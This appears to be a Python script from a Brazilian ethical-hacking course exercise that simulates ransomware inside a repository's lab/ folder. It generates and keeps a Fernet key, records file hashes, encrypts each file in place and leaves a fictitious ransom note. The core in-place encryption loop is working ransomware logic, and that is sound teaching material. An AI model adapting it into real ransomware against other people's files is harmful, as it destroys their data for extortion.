#!/usr/bin/env python3
"""
RANSOMWARE SIMULADO — desafio DIO (Ethical Hacking / Cibersegurança).

⚠️⚠️  USO EXCLUSIVAMENTE EDUCACIONAL ⚠️⚠️
- Opera SOMENTE dentro da pasta `lab/` deste repositório (trava abaixo).
- Sem propagação, sem persistência, sem contato com servidor externo.
- Usar técnica semelhante contra dados de terceiros é CRIME
  (Brasil: art. 154-A e 266 do Código Penal; lei 12.737/2012).

Mecânica didática implementada:
1. Gera uma chave Fernet (AES-128-CBC + HMAC-SHA256) e salva em lab/.chave.key
2. Salva um manifesto com o SHA-256 ORIGINAL de cada arquivo (prova de integridade)
3. Criptografa cada arquivo da pasta, no próprio lugar
4. Deixa a "nota de resgate" (conteúdo FICTÍCIO)

Descriptografe com decrypt_sim.py usando a MESMA chave.
"""
import hashlib
import json
import sys
from pathlib import Path

from cryptography.fernet import Fernet

REPO_ROOT = Path(__file__).resolve().parent.parent
LAB_DIR = REPO_ROOT / "lab"
KEY_NAME = ".chave.key"
MANIFEST_NAME = ".manifesto.json"
NOTE_NAME = "LEIA_ME_RESGATE.txt"

NOTE_TEXT = """\
==============================================================
      SEUS ARQUIVOS FORAM "CRIPTOGRAFADOS" (SIMULAÇÃO!)
==============================================================

Isto é um EXERCÍCIO EDUCACIONAL do desafio DIO.
Nenhum dado real foi afetado — os arquivos são fictícios e a
chave está em .chave.key dentro desta mesma pasta.

Ransomware REAL: só recupera pagando? NÃO. Recupera com BACKUP.
Não pague resgate. Restaure de backup e corrija a causa raiz.
==============================================================
"""


def falha(msg: str) -> None:
    print(f"[X] RECUSADO: {msg}")
    print("    Este script só opera dentro de lab/ do repositório (trava de segurança).")
    sys.exit(2)


def validar_lab() -> Path:
    """Trava de segurança: só trava dentro de lab/ do repositório."""
    if not LAB_DIR.exists() or not any(LAB_DIR.iterdir()):
        falha(f"a pasta {LAB_DIR} não existe ou está vazia. Rode gerar_arquivos_teste.py.")
    return LAB_DIR


def sha256(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def main() -> int:
    lab = validar_lab()
    arquivos = sorted(
        p for p in lab.iterdir()
        if p.is_file() and p.name not in (KEY_NAME, MANIFEST_NAME, NOTE_NAME)
    )
    if not arquivos:
        falha("nenhum arquivo para criptografar em lab/.")

    # 1) chave simétrica
    chave = Fernet.generate_key()
    (lab / KEY_NAME).write_bytes(chave)
    print(f"[+] chave Fernet gerada -> lab/{KEY_NAME}  (NUNCA comite isso!)")

    # 2) manifesto com hash original (prova de integridade pós-decifra)
    manifesto = {p.name: sha256(p.read_bytes()) for p in arquivos}
    (lab / MANIFEST_NAME).write_text(json.dumps(manifesto, indent=2), encoding="utf-8")
    print(f"[+] manifesto de integridade -> lab/{MANIFEST_NAME}")

    # 3) criptografa no próprio lugar
    fernet = Fernet(chave)
    for p in arquivos:
        original = p.read_bytes()
        p.write_bytes(fernet.encrypt(original))
        print(f"[*] CRIPTOGRAFADO: {p.name}  ({len(original)} -> {p.stat().st_size} bytes)")

    # 4) nota de resgate (fictícia)
    (lab / NOTE_NAME).write_text(NOTE_TEXT, encoding="utf-8")
    print(f"[+] nota de resgate -> lab/{NOTE_NAME}")

    print(f"\n[DONE] {len(arquivos)} arquivo(s) 'sequestrado(s)' em lab/ (SIMULAÇÃO).")
    print("       Para restaurar: python ransomware/decrypt_sim.py")
    return 0


if __name__ == "__main__":
    sys.exit(main())
